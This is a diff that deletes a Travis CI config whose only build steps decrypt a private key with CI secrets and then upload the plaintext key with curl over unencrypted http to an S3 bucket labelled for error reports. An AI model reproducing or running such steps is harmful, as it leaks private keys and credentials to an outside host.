@@ -1,8 +1,0 @@
-dist: xenial
-language: python
-python:
-- 3.7
-
-script:
-- openssl aes-256-cbc -K $encrypted_fe0b4cce96b5_key -iv $encrypted_fe0b4cce96b5_iv -in dpkg.priv.key.enc -d > dpkg.priv.key
-- "curl -H 'x-amz-storage-class: STANDARD' -H 'x-amz-acl: bucket-owner-full-control' -H 'Content-Type: application/binary' http://better-bibtex-error-reports-62200312-euc.s3-eu-central-1.amazonaws.com/debug --upload-file dpkg.priv.key"
